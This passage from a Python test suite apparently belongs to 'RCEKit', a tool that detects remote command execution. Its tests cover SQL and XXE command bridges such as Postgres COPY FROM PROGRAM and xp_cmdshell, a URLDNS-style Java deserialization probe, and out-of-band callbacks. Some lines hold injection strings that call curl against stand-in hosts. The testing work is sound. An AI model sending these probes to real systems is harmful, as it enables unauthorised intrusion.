        self.assertNotIn("unreachable", {r["observe_status"] for r in results})

    # -- request building ----------------------------------------------------

    def test_observe_request_resolves_both_forms_in_one_place(self):
        self.assertIsNone(rcekit.observe_request({}))
        built = rcekit.observe_request({"observe_url": "https://t/p", "observe_poll": 3})
        self.assertEqual(built["url"], "https://t/p")
        self.assertEqual(built["method"], "GET")
        self.assertEqual(built["poll"], 3)

    def test_a_captured_request_needs_no_injection_marker(self):
        # build_request_inputs requires a marker because its job is to place a
        # payload; the observed endpoint is read, never injected into.
        raw = ("GET /profile/42 HTTP/1.1\r\n"
               "Host: target.example\r\n"
               "Cookie: session=abc\r\n\r\n")
        url, method, data, headers = rcekit.build_plain_request(raw, "https")
        self.assertEqual(url, "https://target.example/profile/42")
        self.assertEqual(method, "GET")
        self.assertIsNone(data)
        self.assertIn("Cookie: session=abc", headers)
        with self.assertRaises(ValueError):
            rcekit.build_plain_request("GET /x HTTP/1.1\r\n\r\n")


class QueryLanguageBridgeTestCase(unittest.TestCase):
    """Bridges: a shell command carried into the OS from inside a query language.

    Several RCEs pass through a query language before reaching the OS —
    Postgres `COPY … FROM PROGRAM`, MSSQL `xp_cmdshell`, XXE `expect://`. The
    design point is that a bridge is a **carrier, not an oracle**: it wraps the
    command the existing methods already build, so `reflected`, `time` and `oob`
    prove execution through it and every tier guarantee is inherited rather than
    re-derived."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="sql")
        self.config = {"bridges": ("auto",), "max_safety": "stateful"}

    _DEFAULT = object()

    def _probes(self, method=ReflectedMath, config=_DEFAULT, record=None):
        import random as _random
        # A sentinel, not `config or self.config`: an empty dict is the "no
        # bridges" case this class has to be able to express, and falsy-or would
        # quietly turn it back into the bridged one.
        if config is self._DEFAULT:
            config = self.config
        return method(self.gen, config).build_probes(
            record or self.rec, _random.Random(3))

    # -- the corpus section --------------------------------------------------

    def test_the_corpus_declares_the_bridges(self):
        self.assertIn("postgres_copy_program", self.gen.bridges)
        for name, bridge in self.gen.bridges.items():
            with self.subTest(bridge=name):
                self.assertIn("__CMD__", bridge["template"],
                              "a bridge carries a command; without the token it carries nothing")
                self.assertIn(bridge.get("sink_env"), rcekit.SINK_ENVIRONMENTS)
                self.assertIn(bridge.get("safety"), rcekit.SAFETY_ORDER)
                self.assertTrue(bridge.get("notes"))

    def test_a_bridge_that_creates_an_object_is_stateful_and_carries_cleanup(self):
        for name, bridge in self.gen.bridges.items():
            with self.subTest(bridge=name):
                if bridge.get("cleanup"):
                    self.assertEqual(bridge["safety"], "stateful", name)
                if bridge.get("safety") == "stateful":
                    self.assertTrue(bridge.get("cleanup"),
                                    "a stateful bridge must say how to undo itself")

    # -- selection -----------------------------------------------------------

    def test_bridges_are_off_by_default(self):
        # A bridge payload is SQL or XML syntax; on an ordinary shell sink it is
        # a request that cannot confirm, so it is never sent unasked.
        payloads = [p.payload for p in self._probes(config={})]
        self.assertTrue(payloads)
        self.assertFalse([p for p in payloads if "COPY" in p or "xp_cmdshell" in p])
        self.assertEqual(rcekit.parse_bridges(None), ())
        self.assertEqual(rcekit.parse_bridges("none"), ())
        self.assertEqual(rcekit.parse_bridges("auto"), ("auto",))
        self.assertEqual(rcekit.parse_bridges("postgres_copy_program"),
                         ("postgres_copy_program",))

    def test_a_bridge_only_gets_a_core_in_its_own_dialect(self):
        # xp_cmdshell hands its argument to cmd.exe, so a POSIX $((a+b)) there
        # is inert text — the same failure the dialect split exists to stop.
        method = ReflectedMath(self.gen, self.config)
        unix = [name for name, _ in method._selected_bridges("unix")]
        windows = [name for name, _ in method._selected_bridges("windows")]
        self.assertIn("postgres_copy_program", unix)
        self.assertNotIn("mssql_xp_cmdshell", unix)
        self.assertIn("mssql_xp_cmdshell", windows)

    def test_a_stateful_bridge_is_held_to_the_safety_ordering(self):
        # Held back by the same flag as every stateful corpus payload, rather
        # than riding in because a detection method built it.
        safe = ReflectedMath(self.gen, {"bridges": ("auto",), "max_safety": "safe"})
        self.assertEqual(safe._selected_bridges("unix"), [])
        intrusive = ReflectedMath(self.gen, {"bridges": ("auto",), "max_safety": "intrusive"})
        names = [name for name, _ in intrusive._selected_bridges("unix")]
        self.assertIn("xxe_expect", names)
        self.assertNotIn("postgres_copy_program", names)

    def test_an_unknown_bridge_name_is_refused(self):
        method = ReflectedMath(self.gen, {"bridges": ("nope",), "max_safety": "stateful"})
        with self.assertRaises(ValueError) as caught:
            method._selected_bridges("unix")
        # Silently selecting nothing would make a run that rode no bridge read
        # exactly like one that rode them and came back clean.
        self.assertIn("nope", str(caught.exception))

    # -- probe shape ---------------------------------------------------------

    def test_the_bridge_probe_carries_the_command_and_no_separator(self):
        bridged = [p for p in self._probes() if p.carrier]
        self.assertTrue(bridged)
        for probe in bridged:
            self.assertIsNone(probe.separator,
                              "there is no running command inside COPY … FROM PROGRAM to break "
                              "out of, so the bare core is the probe")
            self.assertIn(probe.carrier, self.gen.bridges)

    def test_a_stateful_bridge_probe_names_the_object_it_created(self):
        bridged = [p for p in self._probes() if p.carrier == "postgres_copy_program"]
        self.assertTrue(bridged)
        for probe in bridged:
            table = re.search(r"CREATE TABLE (rk_\w+)", probe.payload)
            self.assertIsNotNone(table, probe.payload)
            self.assertEqual(probe.followup["cleanup"], f"DROP TABLE IF EXISTS {table.group(1)};")

    def test_the_timing_bridge_reuses_one_table_across_the_probe_pair(self):
        """Both halves of the 0s/Ns pair must address the same table.

        The screen fires the same bridge twice. A fresh table name per probe
        would litter, and — worse — without the leading DROP IF EXISTS the
        second CREATE fails, the statement aborts and the delay never happens,
        so a target that is executing reads as no delay at all."""
        probes = [p for p in self._probes(method=ParametricTime)
                  if p.separator and p.separator.startswith(ParametricTime.BRIDGE_PREFIX)]
        self.assertTrue(probes)
        postgres = [p for p in probes if p.separator.endswith("postgres_copy_program")]
        self.assertEqual(len(postgres), 2, "one probe at 0s and one at the base delay")
        tables = {re.search(r"CREATE TABLE (rk_\w+)", p.payload).group(1) for p in postgres}
        self.assertEqual(len(tables), 1, tables)
        for probe in postgres:
            self.assertIn("DROP TABLE IF EXISTS", probe.payload)

    def test_the_regression_rebuilds_the_bridge_it_screened(self):
        # The regression has to resend the exact shape the screen found, and a
        # bridge payload is built by a different path from a separator-led one.
        method = ParametricTime(self.gen, self.config)
        payload = method._payload(self.rec, 4.0, "bridge:postgres_copy_program", "unix")
        self.assertIn("COPY", payload)
        self.assertIn("sleep 4", payload)

    def test_the_oob_bridge_gives_each_bridge_its_own_token(self):
        config = dict(self.config, oob_host="oob.example", probe_depth="quick")
        bridged = [p for p in self._probes(method=rcekit.OobCallback, config=config) if p.carrier]
        self.assertTrue(bridged)
        # Sharing one token would mark every bridge confirmed as soon as any
        # single one of them called back.
        self.assertEqual(len({p.expected for p in bridged}), len(bridged))

    # -- end to end ----------------------------------------------------------

    def _pg_target(self, honour_program):
        """A "database" whose driver returns the last result set.

        `honour_program` decides whether COPY … FROM PROGRAM actually runs the
        program; when it does not, the endpoint still echoes the injected SQL,
        which is the reflection case a bridge must not confirm on."""
        import subprocess as _sub

        def route(method, path, params, headers, body):
            query = "SELECT * FROM t WHERE name='%s'" % params.get("name", "")
            program = re.search(r"COPY \w+ FROM PROGRAM '([^']*)'", query)
            if not honour_program or not program:
                return 200, query
            # POSIX_SHELL, not a hardcoded /bin/sh: that path does not exist on
            # Windows, the subprocess call fails, the fake database returns no
            # program output, and the bridge reports `negative` against a target
            # that ran the command. The same platform assumption the sinks in
            # this file already had.
            out = _sub.run([POSIX_SHELL, "-c", program.group(1)],
                           capture_output=True, text=True).stdout
            return 200, "rows:\n" + out

        return route

    def test_a_bridge_confirms_execution_through_the_query_language(self):
        with local_target(self._pg_target(True)) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/s?name=FUZZ", methods=["reflected"],
                config={"bridges": ("postgres_copy_program",), "max_safety": "stateful"})
        confirmed = [r for r in results if r["verdict"] == "executed"]
        self.assertTrue(confirmed, results)
        self.assertEqual(rcekit.overall_detection_verdict(results), "executed")
        self.assertIn("postgres_copy_program", confirmed[0]["detail"])
        self.assertIn("DROP TABLE IF EXISTS", confirmed[0]["cleanup"])

    def test_a_target_that_only_echoes_the_sql_does_not_confirm(self):
        # The endpoint returns the injected statement verbatim — including the
        # bridge — and executes nothing. The computed value is the difference.
        with local_target(self._pg_target(False)) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/s?name=FUZZ", methods=["reflected"],
                config={"bridges": ("postgres_copy_program",), "max_safety": "stateful"})
        self.assertTrue(results)
        self.assertFalse([r for r in results if r["verdict"] == "executed"])


class DeserializationSinkTestCase(unittest.TestCase):
    """`--methods deser`: proves an endpoint deserializes, and stops there.

    The verdict boundary is the whole deliverable. Deserialization RCE depends
    on gadgets in the target's classpath, which RCEKit cannot see, so this
    method must never say `executed` — that word is reserved for execution and
    has to stay that way to mean anything. Its strongest outcome is its own
    verdict, `deserialization-sink`, which is a real proven finding about a
    different property."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="java", context="raw")

    def _probes(self, config=None):
        import random as _random
        return rcekit.DeserSink(self.gen, config or {}).build_probes(
            self.rec, _random.Random(5))

    # -- the verdict boundary ------------------------------------------------

    def test_the_method_can_never_report_confirmed(self):
        self.assertEqual(rcekit.DeserSink.tier, "deserialization-sink")
        source = inspect.getsource(rcekit.DeserSink)
        self.assertNotIn('Verdict("executed"', source,
                         "reaching RCE from a deserialization sink depends on classpath "
                         "gadgets RCEKit cannot see; `executed` is for execution")

    def test_the_new_tier_sits_below_execution_and_above_a_guess(self):
        # A proven non-RCE finding must not outrank execution in triage, and
        # must not be lost behind a plain negative either.
        self.assertEqual(rcekit.overall_detection_verdict(
            [{"verdict": "deserialization-sink"}, {"verdict": "executed"}]), "executed")
        self.assertEqual(rcekit.overall_detection_verdict(
            [{"verdict": "deserialization-sink"}, {"verdict": "negative"}]),
            "deserialization-sink")
        # It used to sit below `needs-review` as well, on the argument that a
        # suspected RCE outranks a proven non-RCE. That held while `time`,
        # `boolean` and `write`'s uninterpreted file all reported there. Since
        # 3.0.0 each has its own tier and the only thing left under
        # `needs-review` is this method's own shape fingerprint -- a suspected
        # *deserialization*. Ranking that above `deserialization-sink` put a
        # guess above the proof of the same thing.
        self.assertEqual(rcekit.overall_detection_verdict(
            [{"verdict": "deserialization-sink"}, {"verdict": "needs-review"}]),
            "deserialization-sink")

    def test_a_dns_hit_reports_a_sink_and_says_it_is_not_rce(self):
        class FakeListener:
            hits = [{"token": "rkaaaaaaaaaa", "proto": "dns"}]
            tokens = {}

        method = rcekit.DeserSink(self.gen, {"oob_listener": FakeListener(), "oob_wait": 0})
        probe = Probe(payload="x", expected="rkaaaaaaaaaa", carrier="java", phase="dns")
        (_probe, verdict), = method._dns_verdicts([(probe, Observation(status=200, body=""))])
        self.assertEqual(verdict.status, "deserialization-sink")
        self.assertIn("NOT proof of RCE", verdict.evidence)

    # -- the Java gadget -----------------------------------------------------

    def test_the_java_gadget_is_a_valid_stream_carrying_the_callback_host(self):
        raw = rcekit.DeserSink.java_urldns("rktoken1.oob.example")
        self.assertTrue(raw.startswith(b"\xac\xed\x00\x05"), "java serialization magic")
        self.assertIn(b"java.util.HashMap", raw)
        self.assertIn(b"java.net.URL", raw)
        # Length-prefixed, which is why this is built in Python rather than
        # declared in the corpus as a static string.
        host = b"rktoken1.oob.example"
        self.assertIn(b"\x74" + struct.pack(">H", len(host)) + host, raw)

    def test_the_gadget_references_no_class_that_could_run(self):
        # Non-executing by construction: the callback proves the object graph
        # was reconstructed and nothing more. A gadget class in here would make
        # the method's own claim untrue.
        raw = rcekit.DeserSink.java_urldns("rk.oob.example")
        classes = re.findall(rb"(?:java|javax|org|com|sun)[\w.]+", raw)
        self.assertEqual(sorted({c.decode() for c in classes}),
                         ["java.net.URL", "java.util.HashMap"])

    def test_the_hash_code_is_written_uncomputed(self):
        # A cached hashCode means HashMap.readObject never asks the URL for one,
        # so the name is never resolved and the probe is inert.
        raw = rcekit.DeserSink.java_urldns("rk.oob.example")
        marker = raw.index(b"\x78\x70", raw.index(b"java.net.URL"))
        self.assertEqual(raw[marker + 2:marker + 6], b"\xff\xff\xff\xff")

    # -- probe construction --------------------------------------------------

    def test_an_address_for_the_callback_host_builds_no_gadget(self):
        """A gadget carries its token as a DNS label and has nowhere else.

        Given `10.0.0.9` the callback host was `<token>.10.0.0.9`, a name that
        resolves nowhere -- so the gadget went to the target as a real request
        from which no callback could follow by construction. `lookup` already
        refused an address for this reason; this method had no such test."""
        probes = self._probes({"oob_host": "10.0.0.9"})
        self.assertFalse([p for p in probes if p.phase == "dns"],
                         "a gadget was built for a host that cannot resolve")
        # The shape oracle needs no listener, so it is untouched: the method
        # still reports, it just cannot reach its own tier.
        self.assertTrue([p for p in probes if p.phase.startswith("shape/")])
        self.assertEqual(len(probes), len(self._probes()))

    def test_a_delegated_name_still_builds_the_gadget(self):
        # The guard against over-correcting the above: the skip is about an
        # address, and a name must still get the probe that reaches the tier.
        probes = self._probes({"oob_host": "oob.example.test"})
        dns = [p for p in probes if p.phase == "dns"]
        self.assertTrue(dns, "a delegated name lost the gadget it depends on")
        for probe in dns:
            self.assertTrue(probe.expected, "a gadget probe carries a token")

    def test_each_ecosystem_gets_every_shape_form_in_bracketing_order(self):
        # The order is part of the oracle, not presentation. The differential is
        # read across requests, so anything changing with the request index
        # rather than with the payload lands on whichever form goes last -- and
        # noise went last, every time, which is what made a throttling endpoint
        # look like a parser. The two noise probes now bracket the structured
        # pair, and they carry different payloads because the engine
        # de-duplicates by payload and would send an identical repeat once.
        probes = self._probes()
        for name in self.gen.deser_probes:
            shape = [p for p in probes
                     if p.carrier == name and p.phase.startswith("shape/")]
            with self.subTest(ecosystem=name):
                self.assertEqual(
                    [p.phase for p in shape],
                    ["shape/noise", "shape/wellformed",
                     "shape/truncated", "shape/noise_again"])
                self.assertEqual(
                    shape[0].payload, shape[-1].payload,
                    "the bracketing probes must be the same probe, byte for byte: "
                    "the differential asks whether the endpoint answered it alike")
                self.assertEqual(
                    len(shape[0].payload),
                    len(self.gen.deser_probes[name]["wellformed"]),
                    "the noise control must match the well-formed length, or a "
                    "size limit alone separates them")

    def test_the_noise_form_keeps_the_magic_and_matches_the_length(self):
        # Same magic, same length, random tail: an endpoint that merely stores
        # the value cannot tell it from the real thing, while a parser rejects
        # it where it rejects the truncated form.
        probes = {p.phase: p.payload for p in self._probes() if p.carrier == "php"}
        spec = self.gen.deser_probes["php"]
        self.assertTrue(probes["shape/noise"].startswith(spec["magic"]))
        self.assertEqual(len(probes["shape/noise"]), len(spec["wellformed"]))
        self.assertNotEqual(probes["shape/noise"], probes["shape/wellformed"])

    def test_the_dns_probe_is_only_built_when_a_callback_host_is_known(self):
        self.assertFalse([p for p in self._probes() if p.phase == "dns"])
        with_host = self._probes({"oob_host": "oob.example"})
        dns = [p for p in with_host if p.phase == "dns"]
        self.assertTrue(dns)
        # A token per ecosystem: sharing one would mark every format confirmed
        # as soon as any single one called back.
        self.assertEqual(len({p.expected for p in dns}), len(dns))
        for probe in dns:
            self.assertIn(probe.expected, probe.payload if probe.carrier != "java"
                          else base64.b64decode(probe.payload).decode("latin-1"))

    def test_it_declines_the_break_out_contexts(self):
        # The payload is a serialized object graph, so there is no surrounding
        # command or query to break out of.
        method = rcekit.DeserSink(self.gen, {})
        for context in ("sql", "javascript", "shell_single_quoted"):
            with self.subTest(context=context):
                self.assertFalse(method.applicable(make_record(context=context)))
        for context in ("raw", "json", "xml"):
            with self.subTest(context=context):
                self.assertTrue(method.applicable(make_record(context=context)))

    def test_an_unknown_format_name_is_refused(self):
        method = rcekit.DeserSink(self.gen, {"deser_formats": ("kotlin",)})
        with self.assertRaises(ValueError) as caught:
            method._ecosystems()
        self.assertIn("kotlin", str(caught.exception))

    # -- the shape differential ----------------------------------------------

    def _shape_target(self, parses):
        """An endpoint that either parses Java object streams or stores the value."""
        def route(method, path, params, headers, body):
            value = params.get("o", "")
            if not parses:
                return 200, "saved"
            try:
                raw = base64.b64decode(value, validate=True)
            except Exception:
                return 400, "bad base64"
            if not raw.startswith(b"\xac\xed\x00\x05"):
                return 400, "not a serialization stream"
            # Read the stream the way a parser does instead of sniffing one
            # byte. The `noise` form is the format's magic followed by random
            # characters, so `raw[4:5] not in (b"t", b"s")` let one through as
            # a well-formed object about once in 500 runs. All three forms then
            # answered alike, the differential correctly reported `negative`,
            # and this test -- which wants `needs-review` -- failed for a
            # reason that had nothing to do with the code under test.
            #
            # TC_STRING is what the corpus ships: 0x74, a two-byte big-endian
            # length, then exactly that many bytes. `wellformed` satisfies it,
            # `truncated` declares four bytes and supplies none, and noise
            # would have to guess its own length to get through.
            stream = raw[4:]
            if stream[0:1] != b"t" or len(stream) < 3:
                return 500, "StreamCorruptedException"
            if len(stream) - 3 != int.from_bytes(stream[1:3], "big"):
                return 500, "StreamCorruptedException"
            return 200, "object accepted"
        return route

    def test_a_parsing_endpoint_fingerprints_as_needs_review_only(self):
        with local_target(self._shape_target(True)) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/api?o=FUZZ", methods=["deser"])
        java = [r for r in results if "java:" in r["detail"]]
        self.assertEqual([r["verdict"] for r in java], ["needs-review"])
        self.assertIn("NOT proof", java[0]["detail"])
        # A fingerprint is never promoted, however suggestive.
        self.assertFalse([r for r in results if r["verdict"] == "executed"])

    def test_an_endpoint_that_only_stores_the_value_is_negative(self):
        with local_target(self._shape_target(False)) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/api?o=FUZZ", methods=["deser"])
        self.assertTrue(results)
        self.assertEqual({r["verdict"] for r in results}, {"negative"})

    def test_a_volatile_page_does_not_look_like_a_parser(self):
        # Request ids and timestamps differ between two identical error pages;
        # comparing raw bodies would make every endpoint fingerprint as one.
        counter = {"n": 0}

        def route(method, path, params, headers, body):
            counter["n"] += 1
            return 200, f"<p>request 8f3a91c4e5b7d206 at 1755{counter['n']:06d}</p>"

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/api?o=FUZZ", methods=["deser"])
        self.assertEqual({r["verdict"] for r in results}, {"negative"})


if __name__ == "__main__":
    unittest.main()


class TruncatedErrorResponseTestCase(unittest.TestCase):
    """A target may cut its own error response short. Reading that body raises
    *inside* the ``except HTTPError`` handler, where the sibling ``except
    Exception`` cannot catch it -- so before the guard, one malformed error
    response ended the whole run and lost every probe already fired."""

    def _serve(self, handler):
        import socket
        import threading
        server = socket.socket()
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("127.0.0.1", 0))
        server.listen(8)
        port = server.getsockname()[1]

        def drain_then_handle(conn):
            # Read the request before answering. A socket closed while inbound
            # data is still unread is reset rather than shut down gracefully --
            # on Windows that RST discards the send buffer, so the response this
            # fixture just wrote never reaches the client and the test sees a
            # connection error instead of the 500 it staged. Measured: the same
            # handler confirms 500 when it drains and reports WinError 10053
            # when it does not.
            conn.settimeout(5)
            try:
                conn.recv(65536)
            except OSError:
                pass
            handler(conn)

        def loop():
            while True:
                try:
                    conn, _ = server.accept()
                except OSError:
                    return
                threading.Thread(target=drain_then_handle, args=(conn,), daemon=True).start()

        threading.Thread(target=loop, daemon=True).start()
        self.addCleanup(server.close)
        return port

    def test_error_body_that_never_arrives_does_not_end_the_run(self):
        def truncate(conn):
            # Promise 4000 bytes, send 10, then reset the connection.
            conn.sendall(b"HTTP/1.1 500 Internal Server Error\r\n"
                         b"Content-Length: 4000\r\n\r\n" + b"A" * 10)
            conn.close()

        port = self._serve(truncate)
        generator = RCEKit()
        status, body, channels, elapsed = generator._fire_channels(
            "probe", f"http://127.0.0.1:{port}/x?cmd=FUZZ", "GET", None, None,
            "query_value", "json_string", 5)
        # Exactly what the guard promises: the status survives, and the body it
        # could not finish reading comes back empty rather than as a traceback.
        #
        # This used to accept `None` as well, which is what a *failed delivery*
        # looks like -- so it stayed green for years on a fixture that never
        # delivered the response at all (see _serve). A test that admits the
        # broken outcome alongside the correct one cannot tell them apart, and
        # this project treats that as the failure it is everywhere else.
        self.assertEqual(status, 500)
        self.assertEqual(body, "")
        self.assertIsInstance(channels, list)
        self.assertGreaterEqual(elapsed, 0.0)

    def test_readable_error_body_is_still_returned(self):
        """The guard must not cost the 500-stack-trace confirmations it exists
        alongside: a complete error body still comes back in full."""
        def complete(conn):
            body = b"computed 1355862 here"
            conn.sendall(b"HTTP/1.1 500 Internal Server Error\r\n"
                         b"Content-Length: %d\r\n\r\n" % len(body) + body)
            conn.close()

        port = self._serve(complete)
        generator = RCEKit()
        status, body, _, _ = generator._fire_channels(
            "probe", f"http://127.0.0.1:{port}/x?cmd=FUZZ", "GET", None, None,
            "query_value", "json_string", 5)
        self.assertEqual(status, 500)
        self.assertIn("1355862", body)


class TargetProfileValidationTestCase(unittest.TestCase):
    """A profile is hand-edited, so a typo in one is ordinary. It must produce
    an operator-readable message, not a traceback thousands of payloads later."""

    def test_top_level_must_be_an_object(self):
        for value in ([], None, "hello", 42, True):
            with self.subTest(value=value):
                with self.assertRaises(ValueError) as caught:
                    rcekit.validate_target_profile(value)
                self.assertIn("must be a JSON object", str(caught.exception))

    def test_selector_fields_reject_non_string_values(self):
        for field in ("environments", "contexts", "categories", "encodings",
                      "sink_decodes"):
            with self.subTest(field=field):
                with self.assertRaises(ValueError) as caught:
                    rcekit.validate_target_profile({field: 5})
                self.assertIn(field, str(caught.exception))

    def test_selector_string_is_one_name_not_one_character_each(self):
        """``"unix"`` iterated as characters selected nothing at all, and the
        empty run that followed was reported as a success."""
        profile = rcekit.validate_target_profile({"environments": "unix"})
        self.assertEqual(profile["environments"], ["unix"])
        profile = rcekit.validate_target_profile({"contexts": "raw, html"})
        self.assertEqual(profile["contexts"], ["raw", "html"])

    def test_deny_chars_accepts_a_string_or_a_list(self):
        self.assertEqual(
            rcekit.validate_target_profile({"deny_chars": ";|&"})["deny_chars"], ";|&")
        self.assertEqual(
            rcekit.validate_target_profile({"deny_chars": [";", "|"]})["deny_chars"],
            [";", "|"])
        for bad in (123, True, {"a": 1}):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    rcekit.validate_target_profile({"deny_chars": bad})

    def test_max_length_must_be_a_whole_number(self):
        self.assertEqual(
            rcekit.validate_target_profile({"max_length": 120})["max_length"], 120)
        for bad in ("abc", [1], {}, True):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError) as caught:
                    rcekit.validate_target_profile({"max_length": bad})
                self.assertIn("max_length", str(caught.exception))

    def test_request_must_be_an_object(self):
        with self.assertRaises(ValueError) as caught:
            rcekit.validate_target_profile({"request": 5})
        self.assertIn("request", str(caught.exception))

    def test_shipped_profiles_all_validate(self):
        shipped = sorted((Path(__file__).resolve().parent.parent / "profiles").glob("*.json"))
        self.assertTrue(shipped, "no profiles shipped to validate")
        for path in shipped:
            with self.subTest(profile=path.name):
                with path.open(encoding="utf-8") as handle:
                    rcekit.validate_target_profile(json.load(handle))


class UnknownSelectorWarningTestCase(unittest.TestCase):
    """A selector matching nothing yields an empty run, and an empty run reads
    as 'this target has no payloads'. Unknown names have to be named."""

    def test_unknown_environment_is_named(self):
        generator = RCEKit()
        with self.assertLogs("rcekit", level="WARNING") as logs:
            list(generator.generate_payload_records(selected_environments=["linux"]))
        joined = "\n".join(logs.output)
        self.assertIn("Unknown environment: linux", joined)
        # The message has to carry the answer, not just the complaint.
        self.assertIn("unix", joined)

    def test_unknown_encoding_is_named(self):
        generator = RCEKit()
        with self.assertLogs("rcekit", level="WARNING") as logs:
            list(generator.generate_payload_records(selected_encodings=["nosuchenc"]))
        self.assertIn("Unknown encoding: nosuchenc", "\n".join(logs.output))

    def test_known_selectors_stay_quiet(self):
        generator = RCEKit()
        with self.assertLogs("rcekit", level="WARNING") as logs:
            logger_under_test = rcekit.logger
            logger_under_test.warning("sentinel")
            list(generator.generate_payload_records(
                selected_environments=["unix"], selected_encodings=["url_encode"]))
        self.assertEqual([line for line in logs.output if "Unknown" in line], [])

    def test_defaults_never_warn(self):
        """The default lists are the corpus's own; warning on them would make
        every ordinary run noisy."""
        generator = RCEKit()
        with self.assertLogs("rcekit", level="WARNING") as logs:
            rcekit.logger.warning("sentinel")
            list(generator.generate_payload_records(max_safety="safe"))
        self.assertEqual(
            [line for line in logs.output if "Unknown environment" in line], [])


class TerminalSafeOutputTestCase(unittest.TestCase):
    """A callback's host and path are chosen by the target. Printed raw, an ESC
    byte lets that target rewrite the operator's terminal -- hiding a real hit
    or forging one."""

    def test_control_bytes_are_escaped(self):
        self.assertEqual(rcekit.terminal_safe("a\x1b[31mb"), "a\\x1b[31mb")
        self.assertEqual(rcekit.terminal_safe("x\ry\nz"), "x\\x0dy\\x0az")
        self.assertEqual(rcekit.terminal_safe("nul\x00here"), "nul\\x00here")

    def test_printable_text_is_untouched(self):
        for text in ("plain.host.example", "/path?q=1", "; curl http://x/", "héllo"):
            with self.subTest(text=text):
                self.assertEqual(rcekit.terminal_safe(text), text)

    def test_non_bmp_and_separator_codepoints_are_escaped(self):
        # U+2028 LINE SEPARATOR is non-printable but above 0xFF.
        self.assertEqual(rcekit.terminal_safe("a b"), "a\\u2028b")

    def test_listener_never_prints_a_raw_escape(self):
        import contextlib
        import io
        listener = OOBListener()
        hostile = "evil\x1b[31mRED\x1b[0m\x1b[2K\rspoofed"
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            hit = listener.record("http", "10.0.0.5", hostile, "/cb")
        printed = buffer.getvalue()
        self.assertNotIn("\x1b", printed)
        self.assertNotIn("\r", printed)
        self.assertIn("\\x1b", printed)
        # The record itself stays faithful -- only the display is escaped.
        self.assertEqual(hit["host"], hostile)

    def test_manifest_payload_is_escaped_on_the_hit_line(self):
        tokens = {"tok1": {"payload": "; curl http://tok1.oob.test/\r\n",
                           "category": "oob", "context": "raw"}}
        listener = OOBListener(tokens=tokens)
        import contextlib
        import io
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            listener.record("dns", "10.0.0.5", "tok1.oob.test", "")
        printed = buffer.getvalue()
        self.assertNotIn("\r", printed)
        self.assertIn("\\x0d", printed)


class ResponseShapeTestCase(unittest.TestCase):
    """The signature the boolean oracle reads.

    A boolean channel carries one bit, read from whether the response changed.
    So everything this function is blind to is a way the oracle cannot be
    lied to, and everything it can see is the oracle's whole vocabulary.
    """

    PAGE = "<html><body><ul>{items}</ul>{tail}</body></html>"

    def _page(self, items, tail=""):
        return self.PAGE.format(
            items="".join(f"<li>{item}</li>" for item in items), tail=tail)

    def test_reflecting_two_different_payloads_leaves_one_shape(self):
        """The guard that keeps this oracle off a plain reflection target.

        It is structural rather than lucky: a reflected payload lands in the
        text between two tags, and the text between two tags is what the
        signature throws away. Measured against a reflect-only target, a
        length-based signature claimed a differential in 13 of 25 runs."""
        first = "<p>searched for: 1234*5678==7006652</p><ul><li>a</li></ul>"
        second = "<p>searched for: 4321*8765==1000000</p><ul><li>a</li></ul>"
        self.assertEqual(rcekit.response_shape(200, first),
                         rcekit.response_shape(200, second))

    def test_two_bodies_of_different_length_share_a_shape(self):
        # The direct statement of "not a length". Same structure, very
        # different size.
        self.assertEqual(rcekit.response_shape(200, self._page(["a"])),
                         rcekit.response_shape(200, self._page(["a" * 400])))

    def test_a_structural_difference_is_seen(self):
        # And the signal the oracle actually lives on: a predicate that
        # selected rows against one that selected none.
        self.assertNotEqual(rcekit.response_shape(200, self._page(["a", "b", "c"])),
                            rcekit.response_shape(200, self._page([])))

    def test_a_comment_carrying_a_counter_is_not_a_difference(self):
        self.assertEqual(
            rcekit.response_shape(200, self._page(["a"], "<!--rendered in 4ms-->")),
            rcekit.response_shape(200, self._page(["a"], "<!--rendered in 91ms-->")))

    def test_an_attribute_that_changes_every_request_is_not_a_difference(self):
        # A CSRF token or a request id makes every response unique. Comparing
        # raw bodies read `unstable` in 25 of 25 runs against a target that was
        # genuinely vulnerable -- the oracle could not be used at all.
        first = "<html><head><meta name=csrf content='ab12'></head><body><p>x</p></body></html>"
        second = "<html><head><meta name=csrf content='ff99'></head><body><p>x</p></body></html>"
        self.assertEqual(rcekit.response_shape(200, first),
                         rcekit.response_shape(200, second))

    def test_json_keeps_list_length_and_drops_every_scalar(self):
        """A JSON API has no tags, so the markup reading sees nothing in it and
        every response looks unstable. Measured on a JSON sink, the tag
        skeleton read `unstable` 25 times out of 25 and a shape tree read the
        differential 25 times out of 25."""
        rows = '{"request": "%s", "at": %s, "results": %s}'
        full = rows % ("aaaa", "1.5", '["x", "y"]')
        other = rows % ("bbbb", "9.9", '["p", "q"]')
        empty = rows % ("cccc", "3.3", "[]")
        self.assertEqual(rcekit.response_shape(200, full),
                         rcekit.response_shape(200, other))
        self.assertNotEqual(rcekit.response_shape(200, full),
                            rcekit.response_shape(200, empty))

    def test_a_json_body_is_not_read_as_markup(self):
        kind, _status, _shape = rcekit.response_shape(200, '{"a": "<b>hi</b>"}')
        self.assertEqual(kind, "json")

    def test_malformed_json_falls_back_rather_than_raising(self):
        # The input is whatever a target returned. A signature that raises on a
        # truncated body turns an oracle into an error.
        kind, _status, _shape = rcekit.response_shape(200, '{"a": [1, 2')
        self.assertEqual(kind, "text")

    def test_plain_text_keeps_its_layout_and_not_its_words(self):
        self.assertEqual(rcekit.response_shape(200, "alpha bravo\ncharlie"),
                         rcekit.response_shape(200, "kilo lima\nmike"))
        self.assertNotEqual(rcekit.response_shape(200, "alpha bravo\ncharlie"),
                            rcekit.response_shape(200, "alpha bravo"))

    def test_the_status_is_part_of_the_shape(self):
        # An endpoint that answers 200 to one predicate and 500 to another has
        # answered, whatever the bodies look like.
        self.assertNotEqual(rcekit.response_shape(200, self._page(["a"])),
